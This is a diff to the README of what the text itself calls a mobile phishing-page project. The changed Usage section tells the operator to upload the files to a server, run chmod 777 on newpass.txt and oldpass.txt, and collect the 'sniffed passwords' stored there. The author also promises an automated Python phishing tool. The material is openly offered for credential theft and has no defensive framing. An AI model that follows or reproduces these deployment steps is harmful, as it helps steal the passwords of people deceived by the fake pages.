@@ -9,10 +9,10 @@ This phishing pages are really built for mobile devices and it won't go good wit
 
 # Usage
 
->Upload all files to the server
->Give all permissons to newpass.txt and oldpass.txt
- # chmod 777 newpass.txt oldpass.txt
+* Upload all files to the server
+* Give all permissons to newpass.txt and oldpass.txt
+  *chmod 777 newpass.txt oldpass.txt
 
-* You will get sniffed passwords in oldpass.txt and newpass.txt
+You will get sniffed passwords in oldpass.txt and newpass.txt
 
 I know that this is not an awesome project , but I am continuing with this project and will come up with a automated phishing tool in python soon. So stay tuned
